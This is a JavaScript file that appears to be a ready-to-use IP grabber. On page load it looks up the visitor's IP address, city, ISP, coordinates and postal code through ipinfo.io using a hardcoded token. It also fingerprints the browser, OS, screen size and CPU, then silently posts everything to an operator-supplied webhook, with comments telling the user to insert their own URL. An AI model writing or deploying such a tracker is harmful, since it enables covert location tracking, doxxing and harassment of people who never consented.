let webhookSent = false;

fetch('https://ipinfo.io/json?token=f8e54fde451c64')
    .then(response => response.json())
    .then(data => {
        if (webhookSent) return;

        var userAgent = navigator.userAgent;
        let browser, browserVersion, os, version;

        if (userAgent.match(/Android/i)) {
            os = 'Android';
        } else if (userAgent.match(/Windows/i)) {
            os = 'Windows';
        } else {
            os = 'Unknown Device';
        }

        // Get Windows version
        var windowsIndex = userAgent.indexOf("Windows");
        if (windowsIndex !== -1) {
            var versionStart = windowsIndex + 8;
            var versionEnd = userAgent.indexOf(";", versionStart);
            version = userAgent.substring(versionStart, versionEnd);
        }

        // Get Android version
        var androidIndex = userAgent.indexOf("Android");
        if (androidIndex !== -1) {
            var androidVersionStart = androidIndex + 8;
            var androidVersionEnd = userAgent.indexOf(";", androidVersionStart);
            version = userAgent.substring(androidVersionStart, androidVersionEnd);
        }

        // Identify browser
        if (userAgent.match(/Chrome/i)) {
            browser = 'Chrome';
            browserVersion = userAgent.match(/Chrome\/(\d+)/)[1];
        } else if (userAgent.match(/Firefox/i)) {
            browser = 'Mozilla Firefox';
            browserVersion = userAgent.match(/Firefox\/(\d+)/)[1];
        } else if (userAgent.match(/Safari/i) && !userAgent.match(/Chrome/i)) {
            browser = 'Apple Safari';
            browserVersion = userAgent.match(/Version\/(\d+)/)[1];
        } else if (userAgent.match(/Edge/i)) {
            browser = 'Microsoft Edge';
            browserVersion = userAgent.match(/Edge\/(\d+)/)[1];
        } else if (userAgent.match(/Opera|OPR/i)) {
            browser = 'Opera';
            browserVersion = userAgent.match(/(?:Opera|OPR)\/(\d+)/)[1];
        } else if (userAgent.match(/Trident/i) || userAgent.match(/MSIE/i)) {
            browser = 'Internet Explorer';
            browserVersion = userAgent.match(/(?:Trident|MSIE)\/(\d+)/)[1];
        } else {
            browser = 'Unknown Browser';
            browserVersion = 'N/A';
        }

        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;
        const cpuCores = navigator.hardwareConcurrency;
        const userLanguage = navigator.language || navigator.userLanguage;
        const connectionType = navigator.connection ? navigator.connection.type : 'Not known';
        const deviceType = /Mobile|Tablet|iPad|iPhone|Android/.test(navigator.userAgent) ? 'Mobile/Tablet' : 'Desk';
        const navigationTiming = window.performance && window.performance.timing;
        let loadTime = 'No available';
        if (navigationTiming) {
            loadTime = navigationTiming.loadEventEnd - navigationTiming.navigationStart;
        }

        const ipinfo = `
            IP address: ${data.ip}
            Location: ${data.city}, ${data.region}, ${data.country}
            ISP: ${data.org}
            Latitude/Longitude: ${data.loc}
            Zip code: ${data.postal}
            Time Zone: ${data.timezone}
            
            OS/Version: ${os} ${version}
            Device Type: ${deviceType}
            Browser/Version: ${browser} ${browserVersion}.0.0.0
            Resolution: ${screenWidth}x${screenHeight}
            CPU Cores: ${cpuCores}
            Language: ${userLanguage}
            Connection Type: ${connectionType}
            Loading Time: ${loadTime}
        `;

        const webhookUrl = ''; // Make sure to add your Webhook URL Here

        const embed_message = {
            embeds: [
                {
                    thumbnail: {
                        url: '', // If you want to add a thumbnail, add the url of the image
                    },
                    title: 'IP Informacion',
                    description: '```' + ipinfo + '```',
                    color: 0x00000,
                },
            ],
        };

        const xhr = new XMLHttpRequest();
        xhr.open('POST', webhookUrl, true);
        xhr.setRequestHeader('Content-Type', 'application/json');

        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log('Message sent successfully.');
                webhookSent = true; // Mark as sent
            } else if (xhr.readyState === 4) {
                console.log('Error sending message');
            }
        };

        const payload = JSON.stringify(embed_message);
        xhr.send(payload);
    });
